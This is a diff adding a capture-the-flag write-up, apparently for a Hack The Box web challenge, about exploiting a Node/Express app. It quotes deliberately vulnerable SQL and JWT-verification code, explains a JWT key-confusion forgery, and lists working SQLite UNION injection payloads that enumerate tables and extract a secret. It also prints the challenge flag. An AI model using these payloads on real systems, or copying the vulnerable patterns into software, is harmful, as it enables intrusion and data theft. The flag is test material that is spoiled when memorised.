@@ -13,7 +13,86 @@ A company that specialises in web development is creating a new site that is cur
 A zip file is provided which includes an express project files.
 
 * Recon
+Looking at the source code, two things are of intrest. The first one is ~getUser~ which makes an sql query without any sanitization beforehand.
+#+begin_src js
+getUser(username){
+    return new Promise((res, rej) => {
+        db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
+            if (err) return rej(err);
+            res(data);
+        });
+    });
+}
+#+end_src
+
+/Note that other functions in the same module do use proper sanitization./
+
+We want to look for a place where this function is called. This happens inside a custom middleware function.
+#+begin_src js
+router.get('/', AuthMiddleware, async (req, res, next) => {
+    try{
+        let user = await DBHelper.getUser(req.data.username);
+        if (user === undefined) {
+            return res.send(`user ${req.data.username} doesn't exist in our database.`);
+        }
+        return res.render('index.html', { user });
+    }catch (err){
+        return next(err);
+    }
+});
+#+end_src
+
+The problem is that we can't get [[id:20113752-5c4c-4119-ae16-f96d112bdfaf][SQL Injection]] by just providing a user name with a special query. This is because any single or double quote get replaced before inserting the name into a [[id:8b76eb72-ae21-4e36-97fe-5ccf308a27d9][JWT]] token as a cookie.
+
+Our goal is to change the "username" field inside the token, but then we run into a second problem, by changing anything inside the token, we don't get a valid signature. Fortunately, the JWT helper module is written in a way, where we can leverage a [[id:6bd3bf25-2fd7-4c4c-a98a-356e3617cb11][Key Confusion Attack]] since the decode function can use "HS256" using the public. The public key is also included (for some reason) inside the JWT token which can be extracted easily.
+#+begin_src js
+module.exports = {
+    async sign(data) {
+        data = Object.assign(data, {pk:publicKey});
+        return (await jwt.sign(data, privateKey, { algorithm:'HS256' }))
+    },
+    async decode(token) {
+        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
+    }
+}
+#+end_src
+
 * Foothold
+We want to create a JWT token using "HS256" and the extracted public key. This can be done using ~jwt_tool~, and also using the provided source code (on a special endpoint /token).
+
+The first query is used to check how many columns exist in the table, to make it possible to use ~UNION~ afterwards.
+#+begin_src sql
+idc' order by 2;--
+#+end_src
+No error was returned, we increment to 3 and then 4, which is when it returns an error. 3 columns is what we have.
+
+Next, we need to know what column accepts what value.
+#+begin_src sql
+idc' and 1=2 union select NULL,NULL,'a';--
+#+end_src
+This is done for each column. The values that we get are: int, string, string.
+
+Now we need to know the tables and columns names.
+#+begin_src sql
+idc' and 1=2 union select 1,name,3 from sqlite_master where type = 'table' and name not like 'sqlite_%';--
+idc' and 1=2 union select 1,sql,3 from sqlite_master;--
+#+end_src
+
+We get a table with "flag_storage" and column "top_secret_flaag". We make a ~UNION SELECT~ query to extract the flag.
+#+begin_src sql
+idc' and 1=2 union select 1,top_secret_flaag,3 from flag_storage;--
+#+end_src
+
 * Flag
+#+begin_example
+HTB{d0n7_3xp053_y0ur_publ1ck3y}
+#+end_example
+
 * Notes
+- Trying to get the private key from the public key using a DB attack doesn't work.
+- using ~jwt_tool~ instead of a special endpoint on the locally run server is faster.
+
 * Resources
+- [[https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks][JWT known exploits]]
+- [[https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635][SQL Injection with UNION]]
+- PayloadAllTheThings sqlite injection
